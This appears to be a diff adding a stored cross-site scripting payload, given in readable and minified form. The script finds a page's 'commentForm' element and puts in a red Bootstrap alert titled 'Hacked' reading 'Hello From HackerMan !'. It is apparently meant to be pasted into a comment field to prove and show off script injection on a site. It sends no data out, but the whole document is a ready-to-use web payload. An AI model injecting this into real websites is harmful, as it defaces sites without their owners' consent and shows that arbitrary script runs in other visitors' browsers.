@@ -1,0 +1,30 @@
+<script>
+const hackDomPrependElement = (rootEl,myEl) =>{rootEl.prepend(myEl)}
+const createAlertBox = (msg,title = null)=>{
+    let alert = document.createElement("div")
+    alert.setAttribute("class","alert alert-danger mt-2");
+    alert.setAttribute("id","hack-alert");
+    alert.setAttribute("name","hack-alert");
+    alert.setAttribute("role","alert");
+
+    let textEl = document.createElement("p");
+    textEl.textContent = msg;
+
+    if(title){
+        let titleEl = document.createElement("h4");
+        titleEl.setAttribute("class","alert-heading");
+        titleEl.textContent = title;
+        alert.appendChild(titleEl);
+    }
+
+    alert.appendChild(textEl);
+
+    return alert;
+}
+const form = document.getElementById("commentForm");
+hackDomPrependElement(form.parentElement,createAlertBox("Hello From HackerMan !","Hacked"))
+</script>
+
+MINIFIED VERSION:
+
+<script>const hackDomPrependElement=(e,t)=>{e.prepend(t)},createAlertBox=(e,t=null)=>{let r=document.createElement("div");r.setAttribute("class","alert alert-danger mt-2"),r.setAttribute("id","hack-alert"),r.setAttribute("name","hack-alert"),r.setAttribute("role","alert");let n=document.createElement("p");if(n.textContent=e,t){let e=document.createElement("h4");e.setAttribute("class","alert-heading"),e.textContent=t,r.appendChild(e)}return r.appendChild(n),r},form=document.getElementById("commentForm");hackDomPrependElement(form,createAlertBox("Hello From HackerMan !","Hacked"));</script>
